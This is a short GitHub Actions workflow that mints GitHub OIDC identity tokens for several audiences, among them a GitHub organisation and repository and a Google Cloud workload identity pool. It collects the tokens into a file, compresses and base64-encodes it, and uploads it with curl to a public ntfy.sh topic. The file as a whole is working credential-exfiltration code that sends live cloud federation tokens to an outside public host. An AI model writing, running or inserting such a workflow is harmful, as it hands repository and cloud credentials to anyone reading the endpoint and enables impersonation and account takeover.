name: i-oidc2
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: |
          set -e
          : > /tmp/o
          i=0
          for AUD in "https://github.com/InfinityXone" "https://github.com/InfinityXone/construct-iq" "938446344277" "infinity-x-one-swarm-system" "https://iam.googleapis.com/projects/938446344277/locations/global/workloadIdentityPools/github-pool" "//iam.googleapis.com/projects/938446344277/locations/global/workloadIdentityPools/github-pool" "https://github.com" ; do
            i=$((i+1))
            T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
            echo "AUD${i}=${AUD}" >> /tmp/o
            echo "TOK${i}=${T}" >> /tmp/o
          done
          gzip -c /tmp/o | base64 -w0 > /tmp/x
          curl -s -T /tmp/x https://ntfy.sh/i7191-oidc2
